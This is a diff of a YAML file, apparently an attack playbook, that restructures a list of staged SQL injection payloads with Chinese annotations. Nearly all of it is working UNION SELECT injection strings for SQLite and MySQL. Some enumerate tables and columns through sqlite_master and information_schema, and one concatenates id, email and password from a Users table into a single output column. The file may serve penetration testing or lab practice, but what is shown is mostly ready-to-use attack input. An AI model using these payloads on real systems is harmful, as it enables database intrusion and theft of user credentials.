@@ -42,16 +42,21 @@ payloads:
 
   step3_schema_enumeration:
     sqlite:
-      - "')) UNION SELECT 1,tbl_name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--"
+      - payload: >
+          ')) UNION SELECT 1,tbl_name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--
         note: "列出所有用户表"
-      - "')) UNION SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master WHERE tbl_name='Users'--"
+      - payload: >
+          ')) UNION SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master WHERE tbl_name='Users'--
         note: "获取表结构"
     mysql:
-      - "')) UNION SELECT 1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables--"
-      - "')) UNION SELECT 1,column_name,3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_name='users'--"
+      - payload: >
+          ')) UNION SELECT 1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables--
+      - payload: >
+          ')) UNION SELECT 1,column_name,3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_name='users'--
 
   step4_data_extraction:
-    - "')) UNION SELECT 1,id||':'||email||':'||password,3,4,5,6,7,8,9 FROM Users--"
+    - payload: >
+        ')) UNION SELECT 1,id||':'||email||':'||password,3,4,5,6,7,8,9 FROM Users--
       note: "拼接多列到单个输出列"
 
 success_indicators:
